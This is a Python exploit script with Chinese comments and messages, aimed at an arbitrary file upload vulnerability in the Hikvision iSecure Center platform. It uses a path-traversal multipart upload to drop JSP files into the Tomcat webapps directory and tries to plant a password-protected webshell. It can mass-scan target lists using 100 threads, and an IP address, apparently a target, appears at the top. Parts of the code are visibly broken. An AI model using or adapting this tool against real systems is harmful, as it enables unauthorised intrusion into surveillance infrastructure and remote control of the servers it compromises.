#http://39.171.53.194:8086
import argparse
import re
import requests
import sys
import os
import time

from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(targer):
    url = targer+"/center/api/files;.js"
    headers = {
        "Content - Type": "multipart / form - data; boundary = ----WebKitFormBoundaryxxmdzwoe",
        "User - Agent": "Mozilla / 5.0(Macintosh;  Intel  Mac  OS  X  10_9_3) AppleWebKit/537.36(KHTML, like  Gecko) Chrome/35.0.1916.47 Safari/537.36",
        "Content - Length": "281"
    }
    data = {
        "------WebKitFormBoundaryxxmdzwoe\r\n"
        'Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/qiqi1234.jsp"\r\n'
        'Content-Type:image/jpeg\r\n'
        "\r\n"
        '<%out.println("qiqitest");%>\r\n'
        "------WebKitFormBoundaryxxmdzwoe--\r\n"
    }

    try:
        response = requests.post(url=url, headers=headers, data=str(data), verify=False)

        url1 = targer + "/clusterMgr/qiqi1234.jsp;.js"
        res = requests.get(url=url1, headers=headers, verify=False)
        # print(res.status_code)
        # if response.status_code == 200 and res.status_code == 200 and "qiqitest" in res.text:
        #     print(targer+"存在任意文件上传漏洞! 请访问目标自测：")
        # else:
        #     print("不存在漏洞"+targer)
        if response.status_code == 200:
            if res.status_code == 200 :
                print("文件上传成功，存在漏洞"+targer)
                return True
            else:
                print("不存在漏洞"+targer)
                print(res.status_code)
                return False
        else:
            print("文件上传失败"+targer)
            return False
    except Exception as e:
        print(e)




def exp(targer):
    print("正在努力给你搞一个shell...")
    time.sleep(2)
    os.system("cls")

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe'
    }
    payload = ""  # 木马文件内容
    data = {
        "------WebKitFormBoundaryxxmdzwoe\r\n"
        'Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi1.jsp"\r\n'
        'Content-Type:image/jpeg\r\n'
        "\r\n"
        '<%out.println("{}");%>\r\n'
        "------WebKitFormBoundaryxxmdzwoe--\r\n"
    }.format(payload)
    url = targer + "/center/api/files;.js"

    # while True:
    #     cmd = input("请输入您要执行的命令(按q退出)：")
    #     data = {
    #         "bsh.script":f'exec("{cmd}");'
    #     }
    #     if cmd == 'q':
    #         exit()
    #     res = requests.post(url=target+"/servlet/~ic/bsh.servlet.BshServlet",headers=headers,data=data,verify=False,timeout=5).text
    #     result = re.findall('''<pre>(.*?)</pre>''',res,re.S)[0]
    #     print(result)
    while True:
        payload = input("请输入您要上传的文件(按q退出)：")
        data = {
            "bsh.script":f'exec("{payload}");'
        }
        if payload == 'q':
            exit()
        try:
            response = requests.post(url=url, headers=headers, data=str(data), verify=False)

            url1 = targer + "/clusterMgr/qiqi12.jsp;.js"
            res = requests.get(url=url1, headers=headers, verify=False)
            # print(res.status_code)
            # if response.status_code == 200 and res.status_code == 200 and "qiqitest" in res.text:
            #     print(targer+"存在任意文件上传漏洞! 请访问目标自测：")
            # else:
            #     print("不存在漏洞"+targer)
            if response.status_code == 200:
                if res.status_code == 200 :
                    print('{} webshell上传成功! url：{}  密码：mypasswd\n'.format(targer,url1))
                    return True
                else:
                    print("不存在漏洞"+targer)
                    return False
            else:
                print("文件上传失败"+targer)
                return False
        except Exception as e:
            print(e)

def banna():
    banna = """
             ▄▄▄▄    ▄▄▄       ███▄    █  ▄▄▄       ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
    ▓█████▄ ▒████▄     ██ ▀█   █ ▒████▄     ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
    ▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
    ▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
    ░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
    ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
    ▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
     ░    ░   ░   ▒      ░   ░ ░   ░   ▒      ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
     ░            ░  ░         ░       ░  ░         ░       ░  ░            ░ ░      ░ ░      ░  ░
          ░                                                                                       

    """
    print(banna)


def main():
    banna()

    parser = argparse.ArgumentParser(description="海康威视isecure center 综合安防管理平台存在任意文件上传漏洞")
    parser.add_argument("-u","--url",help="YOUR URL")
    parser.add_argument("-f","--file",help="YOUR FILE")

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)

    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as  fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()